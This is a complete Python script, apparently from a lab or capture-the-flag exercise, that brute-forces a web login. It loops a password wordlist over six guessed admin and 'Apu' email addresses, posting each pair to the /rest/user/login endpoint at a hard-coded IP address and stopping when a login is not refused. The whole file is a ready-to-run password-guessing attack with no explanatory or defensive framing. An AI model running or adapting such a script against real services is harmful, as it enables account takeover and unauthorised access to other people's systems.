import json
import sys

import requests

with open("./passwords") as f:
    passwords = f.readlines()
passwords = [x.strip() for x in passwords]

emails = [
    "Apu@kwike.mart",
    "admin@kwike.mart",
    "Apu@kwik-e.mart",
    "admin@kwik-e.mart",
    "apu@kwik-e.mart",
    "apu@kwike.mart"
]
failed = 0
s = requests.Session()

for password in passwords:
    for email in emails:
        r = s.post(
            'http://43.241.202.33:3003/rest/user/login',
            data=json.dumps({"email": email, "password": password}),
            headers={'Content-type': 'application/json'},
        )
        if r.status_code != 401:
            print("Tried:", failed)
            print("Email:", email)
            print("Password:", password)
            sys.exit()
        else:
            failed += 1
            if failed % 100 == 0:
                print(failed)
